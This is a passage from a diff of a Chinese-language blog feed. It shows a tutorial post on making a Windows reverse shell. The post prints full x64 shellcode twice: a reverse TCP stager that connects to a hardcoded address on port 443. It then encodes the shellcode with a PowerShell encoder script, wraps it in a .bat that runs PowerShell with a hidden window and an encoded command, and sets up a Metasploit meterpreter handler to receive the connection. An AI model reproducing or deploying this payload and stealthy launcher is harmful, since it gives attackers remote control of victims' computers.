data-lang="fallback">0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x98,0x92,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,0xe7
-</code></pre></div><p>貼上我們的模板
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x98,0x92,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,0xe7
+</span></span></code></pre></div><p>貼上我們的模板
 在使用加密腳本加密一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./ps_encoder.py -s 111
-</code></pre></div><p>下載地址 <a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>./ps_encoder.py -s 111
+</span></span></code></pre></div><p>下載地址 <a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py</a></p>
 <p>加密以後
 建立一個bat檔
 powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand &lt;加密後的字串&gt;</p>
 <p>使用MSF監聽</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">use multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set lport 443
-set LHOST 0.0.0.0
-exploit
-</code></pre></div><p>之後執行bat檔就可以看到MSF有反應了
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>use multi/handler
+</span></span><span style="display:flex;"><span>set payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>set lport 443
+</span></span><span style="display:flex;"><span>set LHOST 0.0.0.0
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>之後執行bat檔就可以看到MSF有反應了
 youtube: <a href="http://www.youtube.com/watch?v=oLKTo8dew_o">http://www.youtube.com/watch?v=oLKTo8dew_o</a></p>
 ]]></content:encoded>
     </item>
